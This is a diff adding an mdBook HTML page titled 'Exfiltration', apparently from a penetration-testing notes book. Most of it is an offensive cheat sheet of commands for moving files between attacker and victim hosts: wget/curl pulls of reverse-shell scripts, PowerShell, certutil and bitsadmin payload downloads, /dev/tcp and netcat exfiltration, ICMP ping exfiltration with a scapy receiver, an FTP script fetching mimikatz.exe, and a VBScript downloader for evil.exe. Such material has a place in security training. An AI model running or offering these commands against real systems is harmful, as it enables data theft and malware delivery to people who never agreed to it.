@@ -1,0 +1,482 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Exfiltration</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../custom.css">
+
+        <!-- MathJax -->
+        <script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <p><strong>Exfiltration</strong>
+<em><strong>Reading time: 9 minutes</strong></em></p>
+<p>Commonly whitelisted domains to exfiltrate information
+Check https://lots-project.com/ to find commonly whitelisted domains that can be abused</p>
+<p><strong>Copy&amp;Paste Base64</strong>
+<strong>Linux</strong></p>
+<pre><code class="language-sh">base64 -w0 &lt;file&gt; #Encode file
+base64 -d file #Decode file
+</code></pre>
+<p><strong>Windows</strong></p>
+<pre><code>certutil -encode payload.dll payload.b64
+certutil -decode payload.b64 payload.dll
+</code></pre>
+<p><strong>HTTP</strong>
+Linux</p>
+<pre><code class="language-sh">wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
+curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
+fetch 10.10.14.14:8000/shell.py #FreeBSD
+</code></pre>
+<p>``
+Windows</p>
+<pre><code class="language-sh">certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf 
+#PS 
+(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe") Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe" wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe" Import-Module BitsTransfer Start-BitsTransfer -Source $url -Destination $output 
+#OR 
+Start-BitsTransfer -Source $url -Destination $output -Asynchronous
+
+</code></pre>
+<p><strong>Upload files</strong>
+SimpleHttpServerWithFileUploads
+SimpleHttpServer printing GET and POSTs (also headers)
+Python module uploadserver:</p>
+<pre><code class="language-sh"># Listen to files
+python3 -m pip install --user uploadserver
+python3 -m uploadserver
+# With basic auth:
+# python3 -m uploadserver --basic-auth hello:world
+
+# Send a file
+curl -X POST http://HOST/upload -H -F 'files=@file.txt'
+# With basic auth:
+# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
+</code></pre>
+<p><strong>HTTPS Server</strong></p>
+<pre><code class="language-python"># from https://gist.github.com/dergachev/7028596
+# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
+# generate server.xml with the following command:
+#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
+# run as follows:
+#    python simple-https-server.py
+# then in your browser, visit:
+#    https://localhost:443
+
+### PYTHON 2
+import BaseHTTPServer, SimpleHTTPServer
+import ssl
+
+httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
+httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
+httpd.serve_forever()
+###
+
+### PYTHON3
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import ssl
+
+httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
+httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
+httpd.serve_forever()
+###
+
+### USING FLASK
+from flask import Flask, redirect, request
+from urllib.parse import quote
+app = Flask(__name__)
+@app.route('/')
+def root():
+    print(request.get_json())
+    return "OK"
+if __name__ == "__main__":
+    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
+###
+</code></pre>
+<p><strong>FTP</strong>
+FTP server (python)</p>
+<pre><code class="language-bash">pip3 install pyftpdlib
+python3 -m pyftpdlib -p 21
+</code></pre>
+<p><strong>FTP server (NodeJS)</strong></p>
+<pre><code class="language-sh">
+sudo npm install -g ftp-srv --save
+ftp-srv ftp://0.0.0.0:9876 --root /tmp
+</code></pre>
+<p><strong>FTP server (pure-ftp)</strong></p>
+<pre><code class="language-sh">apt-get update &amp;&amp; apt-get install pure-ftp
+</code></pre>
+<pre><code class="language-bash">#Run the following script to configure the FTP server
+#!/bin/bash
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pwd useradd fusr -u ftpuser -d /ftphome
+pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+ln -s ../conf/PureDB 60pdb
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphome/
+/etc/init.d/pure-ftpd restart
+</code></pre>
+<p><strong>Windows client</strong></p>
+<pre><code>```bash
+#Work well with python. With pure-ftp use fusr:ftp
+echo open 10.11.0.41 21 &gt; ftp.txt
+echo USER anonymous &gt;&gt; ftp.txt
+echo anonymous &gt;&gt; ftp.txt
+echo bin &gt;&gt; ftp.txt
+echo GET mimikatz.exe &gt;&gt; ftp.txt
+echo bye &gt;&gt; ftp.txt
+ftp -n -v -s:ftp.txt
+</code></pre>
+<p><strong>SMB</strong>
+<strong>Kali as server</strong></p>
+<pre><code class="language-bash">kali_op1&gt; impacket-smbserver -smb2support kali `pwd` # Share current directory
+kali_op2&gt; smbserver.py -smb2support name /path/folder # Share a folder
+
+#For new Win10 versions
+impacket-smbserver -smb2support -user test -password test test `pwd`
+</code></pre>
+<p>Or create a smb share <strong>using samba:</strong></p>
+<pre><code class="language-bash">apt-get install samba
+mkdir /tmp/smb
+chmod 777 /tmp/smb
+#Add to the end of /etc/samba/smb.conf this:
+[public]
+    comment = Samba on Ubuntu
+    path = /tmp/smb
+    read only = no
+    browsable = yes
+    guest ok = Yes
+#Start samba
+service smbd restart
+
+</code></pre>
+<p><strong>Windows</strong></p>
+<pre><code class="language-bash">CMD-Wind&gt; \\10.10.14.14\path\to\exe
+CMD-Wind&gt; net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
+
+WindPS-1&gt; New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
+WindPS-2&gt; cd new_disk:
+</code></pre>
+<p><strong>SCP</strong>
+The attacker has to have SSHd running.</p>
+<pre><code class="language-sh">scp &lt;username&gt;@&lt;Attacker_IP&gt;:&lt;directory&gt;/&lt;filename&gt;
+</code></pre>
+<p><strong>SSHFS</strong>
+If the victim has SSH, the attacker can mount a directory from the victim to the attacker.</p>
+<pre><code class="language-bash">sudo apt-get install sshfs
+sudo mkdir /mnt/sshfs
+sudo sshfs -o allow_other,default_permissions &lt;Target username&gt;@&lt;Target IP address&gt;:&lt;Full path to folder&gt;/ /mnt/sshfs/
+</code></pre>
+<p><strong>NC</strong></p>
+<pre><code class="language-bash">nc -lvnp 4444 &gt; new_file
+nc -vn &lt;IP&gt; 4444 &lt; exfil_file
+</code></pre>
+<p><strong>/dev/tcp</strong>
+Download file from victim</p>
+<pre><code class="language-bash">nc -lvnp 80 &gt; file #Inside attacker
+cat /path/file &gt; /dev/tcp/10.10.10.10/80 #Inside victim
+</code></pre>
+<p><strong>Upload file to victim</strong></p>
+<pre><code class="language-bash">nc -w5 -lvnp 80 &lt; file_to_send.txt # Inside attacker
+
+# Inside victim
+exec 6&lt; /dev/tcp/10.10.10.10/4444
+cat &lt;&amp;6 &gt; file.txt
+</code></pre>
+<p>thanks to @BinaryShadow_</p>
+<p><strong>ICMP</strong></p>
+<pre><code class="language-bash"># To exfiltrate the content of a file via pings you can do:
+xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line &lt;IP attacker&gt;; done
+#This will 4bytes per ping packet (you could probably increase this until 16)
+
+</code></pre>
+<pre><code class="language-python">from scapy.all import *
+#This is ippsec receiver created in the HTB machine Mischief
+def process_packet(pkt):
+    if pkt.haslayer(ICMP):
+        if pkt[ICMP].type == 0:
+            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
+            print(f"{data.decode('utf-8')}", flush=True, end="")
+
+sniff(iface="tun0", prn=process_packet)
+</code></pre>
+<p><strong>SMTP</strong>
+If you can send data to an SMTP server, you can create an SMTP to receive the data with python:</p>
+<pre><code class="language-bash">sudo python -m smtpd -n -c DebuggingServer :25
+</code></pre>
+<p><strong>TFTP</strong>
+By default in XP and 2003 (in others it needs to be explicitly added during installation)</p>
+<p>In Kali, start TFTP server:</p>
+<pre><code class="language-bash">#I didn't get this options working and I prefer the python option
+mkdir /tftp
+atftpd --daemon --port 69 /tftp
+cp /path/tp/nc.exe /tftp
+TFTP server in python:
+</code></pre>
+<pre><code class="language-bash">pip install ptftpd
+ptftpd -p 69 tap0 . # ptftp -p &lt;PORT&gt; &lt;IFACE&gt; &lt;FOLDER&gt;
+In victim, connect to the Kali server:
+
+</code></pre>
+<pre><code class="language-bash">tftp -i &lt;KALI-IP&gt; get nc.exe
+PHP
+Download a file with a PHP oneliner:
+</code></pre>
+<pre><code class="language-bash">echo "&lt;?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?&gt;" &gt; down2.php
+</code></pre>
+<p><strong>VBScript</strong></p>
+<pre><code class="language-bash">Attacker&gt; python -m SimpleHTTPServer 80
+</code></pre>
+<p>Victim</p>
+<pre><code class="language-bash">echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
+echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs
+echo Err.Clear &gt;&gt; wget.vbs
+echo Set http = Nothing &gt;&gt; wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget.vbs
+echo http.Open "GET", strURL, False &gt;&gt; wget.vbs
+echo http.Send &gt;&gt; wget.vbs
+echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
+echo Set http = Nothing &gt;&gt; wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs
+echo strData = "" &gt;&gt; wget.vbs
+echo strBuffer = "" &gt;&gt; wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs
+echo Next &gt;&gt; wget.vbs
+echo ts.Close &gt;&gt; wget.vbs
+</code></pre>
+<pre><code class="language-bash">cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
+</code></pre>
+<p><strong>Debug.exe</strong>
+The debug.exe program not only allows inspection of binaries but also has the capability to rebuild them from hex. This means that by providing an hex of a binary, debug.exe can generate the binary file. However, it's important to note that debug.exe has a limitation of assembling files up to 64 kb in size.</p>
+<pre><code class="language-bash"># Reduce the size
+upx -9 nc.exe
+wine exe2bat.exe nc.exe nc.txt
+</code></pre>
+<p>Then copy-paste the text into the windows-shell and a file called nc.exe will be created.</p>
+<p>https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../Docker/docker_storage.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../GeneralHacking/Msfvenom.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../Docker/docker_storage.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../GeneralHacking/Msfvenom.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
